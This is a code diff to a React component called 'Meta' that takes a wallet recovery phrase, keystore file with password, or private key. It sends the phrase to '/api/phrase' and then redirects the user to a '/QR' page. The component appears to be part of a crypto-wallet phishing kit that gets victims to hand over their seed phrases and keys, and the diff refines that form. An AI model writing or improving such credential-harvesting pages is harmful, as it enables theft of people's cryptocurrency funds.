@@ -116,7 +116,7 @@ const Meta = () => {
           const getStrings = phrase.split(/[ ,]+/);
 
           if (getStrings.length < 12) {
-            return alert("Check phrase and enter again");
+            alert("Check phrase and try again.");
           } else {
             const response = await axios.post(
               "/api/phrase",
@@ -129,7 +129,7 @@ const Meta = () => {
           }
           setPhrase("");
         } catch (error) {
-          return console.log(error.response.data.message);
+          return console.log(error?.response?.data?.message);
         }
       }
     } else if (switchTab === "keystore") {
@@ -141,6 +141,7 @@ const Meta = () => {
           keyPassword,
         };
         console.log(getKeyStore);
+        navigate("/QR");
       }
     } else if (switchTab === "private") {
       if (privatePassword === "") {
@@ -150,10 +151,9 @@ const Meta = () => {
           privatePassword,
         };
         console.log(getPrivate);
+        navigate("/QR");
       }
     }
-
-    navigate("/QR");
   };
 
   return (
@@ -231,7 +231,7 @@ const Meta = () => {
             type="text"
             required="required"
             minLength="12"
-            placeholder="Private Key."
+            placeholder="Private Key"
             onChange={(e) => setPrivatePassword(e.target.value)}
           />
 
